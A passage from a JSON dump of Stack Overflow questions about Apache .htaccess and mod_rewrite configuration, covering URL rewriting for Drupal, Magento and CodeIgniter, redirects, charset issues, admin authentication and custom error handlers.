VirtualDocumentRoot and the rewrite rules are not working properly.\n  # For example if your site is at http://example.com/drupal uncomment and\n  # modify the following line\n  #RewriteBase /foo/drupal715\n  #\n  # If your site is running in a VirtualDocumentRoot at http://example.com/,\n  # uncomment the following line:\n  RewriteBase /\n\n  # Pass all requests not referring directly to files in the filesystem to\n  # index.php. Clean URLs are handled in drupal_environment_initialize().\n  RewriteCond %{REQUEST_FILENAME} !-f\n  RewriteCond %{REQUEST_FILENAME} !-d\n  RewriteCond %{REQUEST_URI} ^/foo/drupal715/(.*)$\n  RewriteCond %{REQUEST_URI} !=/favicon.ico\n  RewriteRule ^(.*)$ index.php?q=$1 [L,QSA,B]\n  #RewriteRule ^ index.php [L]\n</code></pre>\n\n<p>best regards</p>\n"},{"tags":[".htaccess","magento","mod-rewrite","url-rewriting","rewrite"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":107,"score":0,"question_id":12270276,"title":"URL Rewrites for magento custom module","body":"<p>I am trying to create some user friendly URLs for my module.</p>\n\n<p>The module name is landing. Right now, I use the index controller and index action, and then grab a string \"page\" from the URL an grab my object based on that. So, my URLs look like this:</p>\n\n<pre><code>http://www.example.com/landing/index/index/page/CoolPage\n</code></pre>\n\n<p>My current idea is to structure this url as /landing/{page}, so that it would be just:</p>\n\n<pre><code>http://www.example.com/landing/CoolPage\n</code></pre>\n\n<p>At first, I tried accomplishing this using htaccess. I have the following:</p>\n\n<pre><code>RewriteRule ^landing/([a-z\\-]+)(/)?$ landing/index/index/page/$1 [R,L]\n</code></pre>\n\n<p>Which works but does a redirect instead of a rewrite. I also tried it with just <code>[L]</code> and without the [] on the end, but I just end up at my 404 page.</p>\n\n<p>Ideally I would use a config rewrite, as that could be packaged with my module, but I can't find any documentation on using them like this. I would be happy using .htaccess or even a db based rewrite, if it worked as desired.</p>\n\n<p>Is there a way to do a rewrite like this in Magento?</p>\n"},{"tags":[".htaccess","mod-rewrite"],"answer_count":1,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":40,"score":1,"question_id":12281498,"title":"Rewrite with htaccess not working","body":"<p>i have a site wich have a dynamic url for 3 pages only. and for that i dont go for php function. So I decided to go for .htaccess rewrite rules but I am not having any luck yet.</p>\n\n<p>This is my actual url: <code>/index.php?mode=service&amp;inid=1</code></p>\n\n<p>I want to rewrite it to this: <code>/home-theater</code></p>\n\n<p>I try it my self and with this code:</p>\n\n<pre><code>RewriteEngine On \n\nRewriteCond %{HTTP_HOST} !^www\\.mysite\\.com.au$ [NC]\nRewriteRule ^(.*)$ http://www.mysite.com.au/$1 [L,R=301]\n\nOptions +FollowSymLinks\nDirectoryIndex index.php\n\nRewriteEngine On\nRewriteBase /\nRewriteCond %{THE_REQUEST} ^[A-Z]{3,9}\\ /index\\.php\\ HTTP/\nRewriteRule ^index\\.php$ http://www.mysite.com.au/ [R=301,L]\n\nRewriteCond %{REQUEST_FILENAME} !-f\nRewriteCond %{REQUEST_FILENAME} !-d\nRewriteRule . /index.php [L]\n\nOptions +FollowSymLinks\nRewriteEngine On\nRewriteRule ^home-theater/?$ index.php?mode=service&amp;inid=1 [L,NC,QSA]\n</code></pre>\n\n<p>I still can't get it to work.</p>\n\n<p>Also I write index.php to www redirect before this code, so I guess if it cause any issue or not. index.php to www site redirects work perfectly but this is not working.</p>\n"},{"tags":[".htaccess","character-encoding","webpage"],"answer_count":0,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":23,"score":0,"question_id":12294563,"title":"Problems with displaying a page","body":"<p>I had a script, called a install.php, and it relies in a /install directory in the WebDoc catalog of my web server (/www/install/install.php, _SERVER[\"SERVER_SOFTWARE\"]    = Apache )\nI also add an .htacces file in the root of my webdoc directory, where I have two lines among others:</p>\n\n<pre><code>AddCharset win-1251 .php .html\nAddType 'text/html; charset=win-1251' php html  \n</code></pre>\n\n<p>File index.php is stored in win-1251 encoding and displays totally correct in my editor with win-1251 encoding (and script must echo correct rusian strings).\nWhen I run script for an execution, I receive this in output:</p>\n\n<pre><code>&lt;h1&gt;�����������&lt;/h1&gt;\n&lt;h2&gt;���� 1. �������������� ��������, ����� core, ��������� ������� ����������� ������.    \n�������� ������ ��� ������� � ��.&lt;/h2&gt;&lt;br /&gt;\n</code></pre>\n\n<p>But the headers of my web document says that:</p>\n\n<pre><code>&lt;html xmlns=\"http://www.w3.org/1999/xhtml\" lang=\"en\" xml:lang=\"en\"&gt;\n&lt;head&gt;\n&lt;title&gt;Install v.9.0&lt;/title&gt;\n&lt;meta http-equiv=\"Content-Type\" content=\"text/html; charset=windows-1251\" /&gt;\n&lt;link href=\"styles.css\" rel=\"stylesheet\" type=\"text/css\" /&gt;\n</code></pre>\n\n<p>So, where do I miss something, or where the bug is hides?  </p>\n\n<p>P.S. Some additional direcrtives, maybe it could help solve my problem:  </p>\n\n<pre><code>_SERVER[\"HTTP_ACCEPT_LANGUAGE\"] ru-RU,ru;q=0.8,en-US;q=0.6,en;q=0.4\n_SERVER[\"HTTP_ACCEPT_CHARSET\"]  windows-1251,utf-8;q=0.7,*;q=0.3\n</code></pre>\n"},{"tags":[".htaccess"],"answer_count":0,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":37,"score":0,"question_id":12291102,"title":".htaccess redirect for two conditions","body":"<p>I would like to make an .htaccess redirect for several conditions. RewriteRule is working, but I can't get the syntax right.</p>\n\n<pre><code># map /lang1 to new /lang1 on new domaine\nhttp://oldsite.com/lang1  -&gt;  http://newsite.com/lang1\n\n# keep one archive directory at old site:\nhttp://oldsite.com/archive  -&gt; http://oldsite.com/archive\n\n# everything else to home page\nhttp://oldsite.com/other  -&gt;  http://newsite.com\nhttp://oldsite.com        -&gt;  http://newsite.com \n\n\n\nOptions +FollowSymLinks \nRewriteEngine on \n\n# this redirects everything\nRewriteRule (.*) http://newsite.com/ [R=301,L] \n</code></pre>\n"},{"tags":["php",".htaccess","mod-rewrite","url-rewriting","webserver"],"answer_count":3,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":105,"score":1,"question_id":12292754,"title":"How to execute php files with .html extension?","body":"<p>i have problem with my site, when i try to convert php to html, i got this error\n<strong>Not Found</strong></p>\n\n<p>and this is .htaccess</p>\n\n<pre><code>RewriteEngine on\nRewriteRule ^(.*)\\.php$ /ver1/$1.html [R=301,QSA,L]\n</code></pre>\n\n<p>all files in folder ver1</p>\n\n<p>i see this post</p>\n\n<p><a href=\"http://stackoverflow.com/questions/8562724/php-url-to-html-url\">.php url to .html url</a></p>\n\n<p>but not work with me</p>\n\n<p>i just need convert php to html and if i go to index.php</p>\n\n<p>i go to index.html and make all url html</p>\n"},{"tags":["php",".htaccess","php.ini"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":77,"score":0,"question_id":12274174,"title":"Allow_url_include is there a way to allow includes from just one url","body":"<p><code>allow_url_include</code> is there a way to allow includes from just one Url. maybe with Htaccess or in the PHP?</p>\n"},{"tags":["apache",".htaccess","codeigniter","mod-rewrite","url-rewriting"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":120,"score":0,"question_id":12291999,"title":"How to remove index.php in codeigniter when changing root directory?","body":"<p>I've got moved the Application and System folders below the root directory as described here. <a href=\"http://codeigniter.com/user_guide/installation/index.html\" rel=\"nofollow\">http://codeigniter.com/user_guide/installation/index.html</a> But I'm not sure how to get the urls to work properly with the new directory locations.</p>\n\n<pre><code>/root/var/\n    `-- www\n        |-- siteroot\n        |       |-- .htaccess\n        |       |-- index.php\n        |       |-- style.css\n        |       |-- script.js\n        |-- application/\n        |-- system/\n</code></pre>\n\n<p>currently this way\n<a href=\"http://example.com/index.php/about\" rel=\"nofollow\">http://example.com/index.php/about</a></p>\n\n<p>this is the way I want it but currently it shows a 404\n<a href=\"http://example.com/about\" rel=\"nofollow\">http://example.com/about</a></p>\n\n<p>this is my current .htaccess file. It removed the index.php before I moved the folders below the root, now it will still remove the index.php but none of the controllers work without the index.php</p>\n\n<pre><code>################################################\n#other hacks can be found at http://codeigniter.com/wiki/mod_rewrite/\n\n&lt;IfModule mod_rewrite.c&gt;\n    RewriteEngine On\n    RewriteBase /\n\n    #Removes access to the system folder by users.\n    #Additionally this will allow you to create a System.php controller,\n    #previously this would not have been possible.\n    #'system' can be replaced if you have renamed your system folder.\n\n    RewriteCond %{REQUEST_URI} ^../system.*\n    RewriteRule ^(.*)$ /index.php?/$1 [L]\n\n    #When your application folder isn't in the system folder\n    #This snippet prevents user access to the application folder\n    #Submitted by: Fabdrol\n    #Rename 'application' to your applications folder name.\n\n    RewriteCond %{REQUEST_URI} ^../application.*\n    RewriteRule ^(.*)$ /index.php?/$1 [L]\n\n    #Checks to see if the user is attempting to access a valid file,\n    #such as an image or css document, if this isn't true it sends the\n    #request to index.php\n\n    RewriteCond %{REQUEST_FILENAME} !-f\n    RewriteCond %{REQUEST_FILENAME} !-d\n    RewriteRule ^(.*)$ index.php?/$1 [L]\n&lt;/IfModule&gt;\n&lt;IfModule !mod_rewrite.c&gt;\n    # If we don't have mod_rewrite installed, all 404's\n    # can be sent to index.php, and everything works as normal.\n    # Submitted by: ElliotHaughin\n\n    ErrorDocument 404 /index.php\n&lt;/IfModule&gt;\n\n################################################\n#http://codeigniter.com/forums/viewthread/92609/\n</code></pre>\n"},{"tags":[".htaccess","mod-rewrite","codeigniter-2","subdomains","wildcard-subdomain"],"answer_count":1,"favorite_count":8,"up_vote_count":5,"down_vote_count":0,"view_count":660,"score":5,"question_id":9732366,"title":"dynamic subdomains in codeigniter with htaccess","body":"<p>Not a question but a solution for implementing dynamic subdomains in codeigniter with htaccess. I was able to make it work for me so I am sharing this with you.</p>\n\n<p>First make sure that subdomains are enabled on your site. When you enter test.yoursite.com it should take you to the welcome page of your site. If instead it gives DNS lookup error then it means subdomains is not enabled on your site.</p>\n\n<p>To enable subdomains on your site add <code>*.yoursite.com</code> entry to the DNS Zone records. </p>\n\n<p>Second insert the following code in your <code>.htaccess</code> file and replace <code>yoursite</code> appropriately.</p>\n\n<pre><code>&lt;IfModule mod_rewrite.c&gt;\n    RewriteEngine On\n    RewriteBase /\n\n    #codeigniter specific rule\n    RewriteCond %{REQUEST_URI} ^system.*\n    RewriteRule ^(.*)$ /index.php?/$1 [L]\n\n    #codeigniter specific rule\n    RewriteCond %{REQUEST_URI} ^application.*\n    RewriteRule ^(.*)$ /index.php?/$1 [L]\n\n    #this rule removes www from the URL if its used\n    RewriteCond %{HTTP_HOST} ^www.\n    RewriteRule ^(.*)$ http://yoursite.com/$1 [R=301,L]\n\n    #the auth system URIs which don't have subdomains\n    RewriteCond %{HTTP_HOST} ^yoursite.\n    RewriteRule ^(signup|signin|forgot_password)/?$ index.php?/auth/$1 [L]\n\n    #this rule handles the subdomains\n    RewriteCond %{HTTP_HOST} ^([a-z0-9]+).yoursite.com\n    RewriteRule ^(.*)$ index.php?/public_site/%1/$1 [L]\n&lt;/IfModule&gt;\n\n&lt;IfModule !mod_rewrite.c&gt;\n    ErrorDocument 404 /index.php\n&lt;/IfModule&gt;\n</code></pre>\n\n<p>Add more rules, if necessary, for handling auth system or subdomains. I know I did for my site to get pretty URIs.</p>\n\n<h2>Important Note:</h2>\n\n<p>I found that by default the subdomain URIs work very well with codeigniter without any of the above rules. You can access all of your site with <code>test.yoursite.com/#</code> URI instead of <code>www.yoursite.com/#</code>. But the URIs are not pretty and there would be more than one way to access a URI.</p>\n\n<p>So if you use the above rules it will give you <strong>pretty URIs</strong> and, more importantly, will give you <strong>unique URIs</strong>. So if you use the above rules you will only get one URI for the signup page and that is <code>http://yoursite.com/signup</code>.</p>\n"},{"tags":[".htaccess","url-rewriting","http-status-code-404","http-status-codes","http-status-code-200"],"answer_count":1,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":44,"score":1,"question_id":12291613,"title":"How can I return 200 when I get 404 by editing .htaccess file?","body":"<p>I've a .htaccess file and an index.html file in root directory of a domain. I've codes below in this .htaccess file:</p>\n\n<pre><code>DirectorySlash Off\n\nRewriteEngine on\nRewriteCond %{REQUEST_FILENAME} -d\nRewriteRule ^(.*[^/])?$ /index.html [L]\n</code></pre>\n\n<p>I hope users will see the contents in index.html when they access to a directory URL no matter this directory URL has trailing slash or not. So I have code above.</p>\n\n<p>But I have a problem. When I access to a directory which doesn't exists. I get 404. This is not what I want. I hope users will always forever get 200 and see contents in index.html when they access to a directory URL. How can I resolve this problem by editing codes above in .htaccess file?</p>\n\n<p>BTW. Please don't redirect users to the index.html file.</p>\n\n<p>Thank you!</p>\n"},{"tags":["apache",".htaccess","mod-rewrite","query-string"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":134,"score":0,"question_id":12291141,"title":"Apache mod_rewrite remove empty query string parameters?","body":"<p>Is it possible to remove empty query string parameters from a URL with Apache's mod_rewrite?</p>\n\n<p>A simple PHP script has an HTML form which submits to itself via GET. The HTML form has many input fields and when submitting via GET the resulting URL can end up being incredibly long, for example...<br>\n<code>http://www.domain.org/script.php?var1=&amp;var2=&amp;var3=foo&amp;var4= ... &amp;var18=bar</code></p>\n\n<p>This PHP script only processes query string paramters whose length is > 0. Empty query string params are ignored.</p>\n\n<p>Is anyone aware of a method that can clear the empty variables within the query string so the URL would become?<br>\n<code>http://www.domain.org/script.php?var3=foo&amp;var18=bar</code></p>\n\n<p>I realise I could do this within my PHP script by processing the GET array and building a new query string based on the GET array elements with values then do an HTTP header redirect. But that sounds pretty rubbish.</p>\n\n<p>Is there was a better way of removing empty query string parameters from a URL?</p>\n"},{"tags":[".htaccess","redirect","get"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":32,"score":0,"question_id":12290755,"title":"Is my query string redirect right?","body":"<p>I want to redirect mypage.com/store/index.php?product_id=62&amp;thisvar=doesntmatter to mypage.com/store#page-anchor. My current redirect looks like this, but doesn't seem to be doing anything. Am I doing something wrong?</p>\n\n<pre><code>RewriteCond %{QUERY_STRING} ^([^&amp;]&amp;)*product_id=62(&amp;|$)\nRewriteRule ^/store/index\\.php$ /store#page-anchor [R=301,L]\n</code></pre>\n\n<p>Edit: I should note that I have the following lines before my rewrite rule:</p>\n\n<pre><code>RewriteEngine On\nRewriteBase /\n</code></pre>\n"},{"tags":["regex","apache",".htaccess","mod-rewrite"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":56,"score":0,"question_id":12273535,"title":"Unexpected results for mod rewrite","body":"<p>I am ready to pull out my hair with this.  I'm an admitted mod_rewrite noob, and it shows.</p>\n\n<p>I am attempting to take the following url:</p>\n\n<p><a href=\"http://mydomain.com/portfolio/1/2/some_seo_friendly_url.html\" rel=\"nofollow\">http://mydomain.com/portfolio/1/2/some_seo_friendly_url.html</a></p>\n\n<p>and send it to:</p>\n\n<p><a href=\"http://mydomain.com/portfolio_brink.php?catid=1&amp;subcatid=2\" rel=\"nofollow\">http://mydomain.com/portfolio_brink.php?catid=1&amp;subcatid=2</a></p>\n\n<p>I've had this working in a simpler format, but my client wants to add this \"easy\" change.  The crazy thing is that the stupid thing keeps loading my portfolio.php page, but not passing any of the variables (I'm checking the $_GET array to verify, and it's empty).</p>\n\n<p>Any help would be GREATLY appreciated.</p>\n\n<p>Edit: adding my complete current .htaccess file.  Web host is 1and1.com, if that helps.</p>\n\n<pre><code>   Options +FollowSymlinks\n   RewriteEngine on\n   RewriteBase /\n\n   RewriteRule ^(.*)portfolio/(.*)/(.*)/(.*)$ portfolio_brink.php?catid=$2&amp;locationid=$3 [NC,L]\n   RewriteRule ^(.*)blog(.+)([0-9+])(.+).html$ blog.php?blogid=$3 [NC,L]\n   RewriteRule ^blog.xml$ blogfeed.php\n</code></pre>\n"},{"tags":[".htaccess"],"answer_count":0,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":25,"score":0,"question_id":12290206,"title":".htaccess rewrite url for pages only, not directories","body":"<p>right now I have some htaccess rules to rewrite my url from example.com?node=home to example.com/home and example.com?node=gallery&amp;id=56 to exmaple.com/gallery/56. Also it fixes my directory paths for my links, css stylesheet, photos and such for the webpage itself are linked correctly, now all of this works as it should, the problem I'm having is if I try to access say, example.com/filename.jpg, it thinks that filename.jpg is a page that it should try to load, instead of bringing me to the directory. So how come this is so, and how can I fix this, and still have my htaccess rules work as they should?</p>\n\n<pre><code>Options +FollowSymLinks -MultiViews\n# Turn mod_rewrite on\nRewriteEngine On\nRewriteBase /\n\n## If the request is for a valid directory\nRewriteCond %{REQUEST_FILENAME} -d [OR]\n## If the request is for a valid file\nRewriteCond %{REQUEST_FILENAME} -f [OR]\n## If the request is for a valid link\nRewriteCond %{REQUEST_FILENAME} -l\n## don't do anything\nRewriteRule ^ - [L]\n\nRewriteRule ^([^/]+)/([^/]+)/?$ index.php/?node=$1&amp;id=$2 [L,QSA]\n\nRewriteRule ^([^/]+)/?$ index.php/?node=$1 [L,QSA]\n</code></pre>\n\n<p>now I also have on the index.php page:</p>\n\n<pre><code>&lt;base href=\"http://www.mysite.com\"&gt;\n</code></pre>\n"},{"tags":[".htaccess"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":30,"score":0,"question_id":12287637,"title":"Customize default directory display using .htaccess","body":"<p>I want to customize the default listing of directory including the header and footer of the page. I tried to search this information however most of the information included how to disable the access to directories or provide the access to directories. My concern is to change the font, include some images in header(i.e change the layout of the page as it displays by default and also put a logout option)with directories being displayed. </p>\n\n<p>any help would be highly appreciated! </p>\n"},{"tags":["php","apache",".htaccess"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":28,"score":0,"question_id":12289207,"title":"Execute custom filename with PHP (via Apache)","body":"<p>On my development machine, this works as expected (requests to <code>server.com/.myhandler</code> are executed as php), but when I uploaded to the production machine (running ubuntu server 11.04) it just serves the un-executed php. Is there anything extra I must configure for this to work?</p>\n\n<p>Contents of <code>.htaccess</code> file:</p>\n\n<pre><code>AddType text/html .myhandler\n&lt;FilesMatch \"\\.myhandler$\"&gt;\n    SetHandler application/x-httpd-php\n&lt;/FilesMatch&gt;\n\nDirectoryIndex .myhandler index.php index.htm\n</code></pre>\n"},{"tags":[".htaccess"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":26,"score":0,"question_id":12289186,"title":"redirecting everything to https://www.domain.com","body":"<p>How would I write the.htaccess file to <a href=\"https://www.domain.com\" rel=\"nofollow\">https://www.domain.com</a></p>\n\n<p>example</p>\n\n<pre><code>domain.com =&gt; https://www.domain.com\nwww.domain.com =&gt; https://www.domain.com\nhttps://domain.com =&gt; https://www.domain.com\nhttp://www.domain.com =&gt; https://www.domain.com\n</code></pre>\n"},{"tags":["php",".htaccess","google-index"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":36,"score":0,"question_id":12289213,"title":"htaccess - how to rewrite rule for lower and uppercase urls","body":"<p>i have following .htaccess, i am getting double urls in google....i have tried some codes in order to block uppercase urls....but nothing works for me...</p>\n\n<p>example of double urls</p>\n\n<pre><code>/Come.php\n/come.php\n</code></pre>\n\n<p>my htaccess file</p>\n\n<pre><code>RewriteEngine On\n\nRewriteRule ^my/shop/([a-zA-Z0-9-]+)/?$ /my/shop/shop.php?cid=$1 [L,QSA]\nRewriteRule ^my/brand/([a-zA-Z0-9-]+)/?$ /my/brand/brand.php?cid=$1 [L,QSA]\nRewriteRule ^my/social-share/([a-zA-Z0-9-]+)/?$ /my/social-share/share.php?shareid=$1\n\nErrorDocument 404 http://www.myweb.co.uk/404.php\n</code></pre>\n\n<p>i have no idea how to block uppercase urls..</p>\n\n<p>thanks for your help.</p>\n"},{"tags":["apache",".htaccess","mod-rewrite"],"answer_count":0,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":18,"score":1,"question_id":12288213,"title":"Mod_rewrite trouble (easy?)","body":"<p>I am attempting to work on a PHP website using Zend Studio.\nThere are a ton of mod_rewrite rules in the .htaccess file.\nOne of these rules is the following:</p>\n\n<pre><code>RewriteCond %{HTTP_HOST} ^mysite\\.com\nRewriteRule ^(.*)$ http://www.mysite.com/$1 [R=301]\nRewriteRule ^/?$ /fitch/index.php?cmd=homepage [NC,L,QSA]\n</code></pre>\n\n<p>I want to run this website on my local Apache-Zend server.\nI tried to create an additional rule below that one like this:</p>\n\n<pre><code>RewriteCond %{HTTP_HOST} ^localhost\nRewriteRule ^(.*)$ http://localhost/$1 [R=301]\nRewriteRule ^/?$ /fitch/index.php?cmd=homepage [NC,L,QSA]\n</code></pre>\n\n<p>I want to make it such that if the server is given the url <code>http://localhost/index.php</code> it redirects to <code>http://localhost/fitch/index.php?cmd=homepage</code></p>\n\n<p>But there seems to be some error because I cannot restart Apache with that in place.\nIf anyone could help me out I would appreciate it!</p>\n"},{"tags":[".htaccess","codeigniter","digest-authentication"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":81,"score":0,"question_id":12281375,"title":"CodeIgniter protect admin controller with .htaccess","body":"<p>I need to setup .htaccess rules in order to protect admin controller in CodeIgniter.</p>\n\n<p>In .htaccess already have rules for friendly URLs like this:</p>\n\n<pre><code>RewriteEngine On\nRewriteBase /\nRewriteCond %{REQUEST_FILENAME} !-f\nRewriteCond %{REQUEST_FILENAME} !-d\nRewriteRule ^(.*)$ index.php?/$1 [L]\n</code></pre>\n\n<p>How to add additional rules to protect all under /admin/ folder (controller) with Digest authentication?</p>\n\n<p>I have tried various combinations but none works correct. Here are some rules which I tried just to get clues what I'm looking for:</p>\n\n<pre><code># set an environtment variable \"doauth\" if the request starts with \"/admin/\"\nSetEnvIf Request_URI ^/admin/ doauth=1\n\nAuthType Digest\nAuthName \"Admin Protected Area\"\nAuthUserFile /hta/.htdigest\n\n# Here is where we allow/deny\nOrder Allow,Deny\nAllow from all\nRequire valid-user\nDeny from env=doauth\nSatisfy any \n</code></pre>\n"},{"tags":[".htaccess","redirect","http-status-code-301"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":37,"score":0,"question_id":12286384,"title":"Why isn't my .htaccess 301 redirect working?","body":"<p>I'm trying to redirect this URL to a different subdomain but am getting a 404.</p>\n\n<p>Need to redirect:</p>\n\n<p>www.dustystrings.com/instrumentbuilding / XYZ</p>\n\n<p>To here:</p>\n\n<p>manufacturing.dustystrings.com/instrumentbuilding / XYZ</p>\n\n<p>I have www.dustystrings.com on one server, and manufacturing.dustystrings.com on another server (necessity).</p>\n\n<p>Basically, I want to redirect all www.dustystrings.com/instrumentbuilding/ queries to manufacturing.dustystrings.com/instrumentbuilding/</p>\n\n<p>What's the right .htacess 301 code to do this? (Apache server)</p>\n"},{"tags":["php","apache",".htaccess","mod-rewrite"],"answer_count":2,"favorite_count":0,"up_vote_count":3,"down_vote_count":0,"view_count":66,"score":3,"question_id":12270660,"title":".htaccess with -Indexes falls into infinite redirect loop when given a directory","body":"<p>This is my .htaccess file:</p>\n\n<pre><code># NO LISTING OF INDEXES\nOptions -Indexes\n\n&lt;IfModule mod_rewrite.c&gt;\n  RewriteEngine On\n\n  # NIX THE www BECAUSE IT IS NO LONGER 1996 AND YOU'RE COOLER THAN THAT\n  RewriteCond %{HTTPS} !=on\n  RewriteCond %{HTTP_HOST} ^www\\.(.+)$ [NC]\n  RewriteRule ^(.*)/$ http://%1/$1 [R=301,L]\n\n  # NIX TRAILING SLASHES BECAUSE SEO IS A VENGEFUL GOD AND WHATNOT\n  RewriteRule ^(.*)/$ $1 [R=301,L]\n\n  # SEND ALL NON-FILE REQUESTS TO index.php FOR FIGURING OUT\n  RewriteBase /\n  RewriteRule ^index\\.php$ - [L]\n  RewriteCond %{REQUEST_FILENAME} !-f\n  RewriteCond %{REQUEST_FILENAME} !-d\n  RewriteRule . /index.php [L]\n&lt;/IfModule&gt;\n\n# ERROR DOCS\nErrorDocument 400 /error/400\nErrorDocument 401 /error/401\nErrorDocument 403 /error/403\nErrorDocument 404 /error/404\nErrorDocument 500 /error/500\n</code></pre>\n\n<p>If I try to access a folder (<code>/images/</code> or <code>/images</code> or some other real folder in my site structure) it falls into a redirect loop. </p>\n\n<p>I tried adding <code>RewriteCond %{REQUEST_FILENAME} !-d</code> before the trailing slashes rule, and that \"fixed\" the redirect in as far as it now enforced the trailing slash on proper folders—but also passed the folder name to my script as if it were a baked URI query for my CMS to figure out. </p>\n\n<p>I guess I could now try to fix this on the CMS side by checking if the URI is a folder that someone is trying to illegally list, but ideally there would be a graceful <code>.htaccess</code> solution to redirect folder listing calls to one of those forbidden pages I so helpfully declare there. Does anyone know of one?</p>\n"},{"tags":["apache",".htaccess","redirect"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":19,"score":0,"question_id":12285660,"title":"Redirect from *.example.com and example.com to foo.example.com","body":"<p>How do I redirect all users from *.example.com and example.com to foo.example.com?</p>\n\n<p>My server is using Apache.</p>\n"},{"tags":["apache",".htaccess","apache2","cgi"],"answer_count":0,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":12,"score":0,"question_id":12284984,"title":"htaccess: Check whether the Server is executing PHP as CGI","body":"<p>Is there a way to restrict destrictives in a <code>.htaccess</code> file to be only executed when the server is running PHP (or something else) as CGI?</p>\n\n<p>Something similiar to this maybe?:</p>\n\n<pre><code>&lt;IfModule mod_rewrite.c&gt;\n  # directives\n&lt;/IfModule&gt;\n</code></pre>\n"},{"tags":["apache",".htaccess","mod-rewrite","alias","dreamhost"],"answer_count":1,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":60,"score":1,"question_id":12274695,"title":"Aliases on Dreamhost, general management of http request / server errors","body":"<p>I had a hard time deciding how I should manage these errors (404, 500, ...) and when I finally decided, I am encountering problems. This is a reeeeeally long question, I appreciate anyone's attempt to help!</p>\n\n<p>Let me first describe how I decided to set it up. I have several sites hosted on a shared Dreamhost account. In the folder structure that I see, everything of mine on the server is under /home/username, and for example, site1.com's web root is at <pre>/home/username/site1.com</pre></p>\n\n<p>I am creating a generic error handler (php script) for errors like 404 not found, 500, etc. that I want to store above the web roots of my sites at <pre>/home/username/error_handler/index.php</pre> so that I can use an .htaccess file at /home/username/.htaccess which includes something like the following:</p>\n\n<pre>ErrorDocument 404 /error_handler/index.php\nErrorDocument 500 /error_handler/index.php</pre>\n\n<p>...and many more</p>\n\n<p>When these errors occur on any of my sites, I want it to be directed to <pre>/home/username/error_handler/index.php</pre>This is the problem I'm having a hard time figuring out. The ErrorDocument directives above will actually cause Apache to look for <pre>/home/username/site1.com/error_handler/index.php</pre></p>\n\n<p>Anyway, the errors should be redirected to my error handling php script. The script will use $_SERVER['REDIRECT_STATUS'] to get the error code, then use $_SERVER['REDIRECT_URL'] and $_SERVER['HTTP_HOST'] to decide what to do. It will check if an error handler specific to that site exists (for example: site1.com/errors/404.php). If this custom page doesn't exist, it will output a generic message that is slightly more user-friendly and styled, and perhaps will include some contact info for me depending on the error.</p>\n\n<p>Doing it this way lets me funnel all these errors through this 1 php script. I can log the errors however I like or send email notifications if I want. It also lets me set up the ErrorDocument Apache directives once for all my sites instead of having to do it for every site. It will also continue to work without modification when I move the site around, since I already have a system that scans the folder structure to figure out where my site roots are when they really aren't at the web root technically speaking. This may not be possible with other solutions like using mod_rewrite for all 404 problems, which I know is common. Or if it is possible, it may be very difficult to do. Plus, I have already done that work, so it will be easy for me to adapt.</p>\n\n<p>When I am working on sites for which I don't have a domain name yet (or sites where the domain name is already in use at the moment), I store them temporarily in site1.com/dev/site3.com for example. Moving the site to site3.com eventually would cause me to have to update the htaccess files if I had one for each site. Changing the domain name would do the same.</p>\n\n<p>Ex: a site stored at site1.com/dev/site3.com would have this in its htaccess file:</p>\n\n<pre>ErrorDocument 404 /site1.com/dev/site3.com/error/404.php</pre>\n\n<p>And it would have to be changed to this:</p>\n\n<pre>ErrorDocument 404 /site3.com/error/404.php</pre>\n\n<p>Obviously, this isn't a huge amount of work, but I already manage a lot of sites and I will probably be making more every year, 95% of which will be hosted on my shared DreamHost account. And most of them get moved at least once. So setting up something automatic will save me a some effort in the long run.</p>\n\n<p>I already have a system set up for managing site-relative links on all my sites. These links will work whether the site exists in a subdirectory of an existing site, or in their own domain. They also work without change in a local development server despite a difference in the web root location. For example, on the live server, the site-relative http link /img/1.jpg would resolve to the file /home/username/site1.com/img/1.jpg while on my local development server it would resolve to C:\\xampp\\htdocs\\img\\1.jpg, despite what I consider the logical site root being at C:\\xampp\\htdocs\\site1.com. I love this system, and it is what gave me the idea to set up something that would work automatically like I expected it to, based on the file structure I used.</p>\n\n<p>So, if I could get it to work, I think this seems like a pretty good system. But I am still very new to apache configuration, mod_rewrite, etc. It's possible there is a much easier and better way to do this. If you know of one, please let me know.</p>\n\n<p>Anyway, all that aside, I can't get it working. The easiest thing would be if I could have the ErrorDocument directive send the requests to folders above the web root. But the path is a URL path relative to the document root. Using the following in /home/username/.htaccess,</p>\n\n<pre>ErrorDocument 404 /error_handler/index.php</pre>\n\n<p>a request for a non-existent resource causes Apache to look for the file at </p>\n\n<pre>site1.com/error_handler/index.php</pre>\n\n<p>So I thought I should set up a redirection (on all my sites) that would redirect those URLS to /home/username/error_handler. I tried a few things and couldn't get any of them to work.</p>\n\n<p>Alias seemed like the simplest solution, but it is something that has to be set at server runtime (not sure if that is the right terminology - when the server is started). On my local server, it worked fine using:</p>\n\n<pre>Alias /error_handler C:\\xampp\\htdocs\\error_handler2</pre>\n\n<p>I changed the local folder to test that the Alias was functioning properly. (On the local server, the URL path specified by the ErrorDocument directive is actually pointing to the right folder, since in my local server the web root is technically C:\\xampp\\htdocs and I store the error handler I 